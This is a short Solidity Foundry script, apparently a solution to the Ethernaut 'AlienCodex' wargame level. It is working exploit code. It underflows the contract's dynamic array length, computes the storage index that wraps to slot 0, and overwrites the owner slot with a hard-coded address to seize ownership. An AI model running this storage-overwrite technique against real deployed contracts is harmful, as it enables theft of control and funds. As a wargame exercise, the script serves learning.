// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Instances/AlienCodeX.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract Exploit is Script {
    AlienCodex public target = AlienCodex(0x5A1e6B680fA569D3c03bF7e8CdFe78f426C4E95d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        console.log("index: ", index);
        target.makeContact();
        target.retract();
        target.revise(index, bytes32(uint256(uint160(0xde90dD6033BFA475e3d517ec882c253B4E6D8B64))));
        vm.stopBroadcast();
    }
}